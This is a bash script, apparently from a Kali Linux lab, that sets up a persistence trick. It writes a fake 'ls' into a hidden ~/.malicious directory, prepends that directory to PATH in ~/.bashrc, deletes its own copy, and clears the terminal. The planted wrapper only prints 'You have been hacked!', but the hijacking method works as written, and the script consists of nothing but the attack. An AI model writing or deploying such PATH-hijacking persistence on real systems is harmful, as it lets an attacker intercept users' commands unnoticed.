#!/bin/bash


mkdir -p ~/.malicious
# ls -ld ~/.malicious

#!/bin/bash
cd ~/.malicious || { echo "Failed to cd into ~/.malicious"; exit 1; }

# Step 2: Create the malicious `ls` script
cat > ls << 'EOF'
#!/bin/bash
echo "You have been hacked!"
/bin/ls "$@"
EOF

# Step 3: Make the `ls` script executable
chmod +x ls

# Step 4: Modify the PATH variable to include the malicious directory
echo 'export PATH=~/.malicious:$PATH' >> ~/.bashrc

# Step 5: Source the updated .bashrc to apply changes immediately
# cp /media/kali/674A-CF41/lshack.sh /home/kali/  && chmod +x /home/kali/lshack.sh && /home/kali/lshack.sh 
rm -fr lshack.sh
# Step 6: Clear the terminal (equivalent to pressing Ctrl+L)
clear

source ~/.bashrc
echo "Exploit kit setup complete! The malicious 'ls' command is now active."
echo "Maybe use source ~/.bashrc"

